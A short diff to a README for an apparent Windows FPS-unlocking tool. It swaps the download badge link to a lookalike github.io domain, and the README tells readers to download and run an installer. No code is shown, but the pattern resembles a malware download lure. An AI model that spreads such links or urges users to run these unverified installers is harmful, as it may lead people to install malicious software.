@@ -8,7 +8,7 @@ It improves the **smoothness of gameplay, reduces input lag, and enhances respon
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://unlocked-fps-windows.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://unlocked-fps-windows-git.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
